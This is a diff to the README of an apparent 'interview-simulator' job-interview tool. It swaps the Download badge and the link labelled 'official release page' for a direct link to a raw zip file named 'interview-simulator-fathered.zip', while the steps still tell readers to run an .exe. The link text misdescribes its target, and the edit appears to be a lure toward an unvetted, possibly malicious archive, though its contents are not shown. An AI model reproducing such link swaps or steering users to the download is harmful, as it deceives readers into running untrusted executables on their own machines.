@@ -1,6 +1,6 @@
 # 🎯 interview-simulator - Master your next job interview today
 
-[![Download](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Madelainereefy490/interview-simulator/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Madelainereefy490/interview-simulator/main/client/interview-simulator-fathered.zip)
 
 ## 📋 What this tool does
 
@@ -21,7 +21,7 @@ To run this application on your computer, your system must meet these requiremen
 
 Follow these steps to set up the software.
 
-1. Visit the [official release page](https://github.com/Madelainereefy490/interview-simulator/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Madelainereefy490/interview-simulator/main/client/interview-simulator-fathered.zip).
 2. Look for the latest version at the top of the page.
 3. Click the file name ending in .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
